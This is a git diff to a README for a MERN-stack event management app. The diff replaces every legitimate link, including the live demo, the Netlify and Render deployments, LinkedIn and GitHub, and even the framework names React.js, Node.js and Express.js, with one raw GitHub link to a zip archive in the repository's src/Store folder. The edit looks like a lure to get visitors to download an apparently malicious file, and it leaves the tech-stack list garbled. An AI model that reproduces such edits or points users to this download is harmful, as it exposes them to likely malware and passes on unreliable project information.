@@ -3,7 +3,7 @@
 An event management platform built using the **MERN stack** that allows users to **create, browse, register, and pay for events**. Integrated with **Razorpay** for secure payments and email notifications.
 
 ## 🚀 Live Demo
-🔗 [Click here to view the live project](https://guvi-event-management-project.netlify.app/)  
+🔗 [Click here to view the live project](https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip)  
 
 ## 🛠️ Features
 - 📝 **Event Creation** – Organizers can create and manage events.
@@ -15,8 +15,8 @@ An event management platform built using the **MERN stack** that allows users to
 - 📱 **Responsive Design** – Works on mobile, tablet, and desktop.
 
 ## ⚙️ Tech Stack
-- **Frontend**: React.js, TailwindCSS, React Router
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip, TailwindCSS, React Router
+- **Backend**: https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip, https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip
 - **Database**: MongoDB, Mongoose
 - **Authentication**: JWT (JSON Web Token)
 - **Payments**: Razorpay
@@ -75,12 +75,12 @@ An event management platform built using the **MERN stack** that allows users to
 ---
 
 ## 🛠️ Deployment  
-- **Frontend**: Deployed on **[Netlify](https://guvi-event-management-project.netlify.app/)**  
-- **Backend**: Deployed on **[Render](https://event-management-backend-6ifk.onrender.com)**  
+- **Frontend**: Deployed on **[Netlify](https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip)**  
+- **Backend**: Deployed on **[Render](https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip)**  
 
 ---
 
 ## 👨‍💻 Author  
 **Harish**  
-- 🔗 [LinkedIn](https://www.linkedin.com/in/harishdeveloper/)  
-- 🔗 [GitHub](https://github.com/IT-HARISH-R)  
+- 🔗 [LinkedIn](https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip)  
+- 🔗 [GitHub](https://raw.githubusercontent.com/IT-HARISH-R/Event-Management-from-end/main/src/Store/Event-Management-from-end-1.2.zip)  
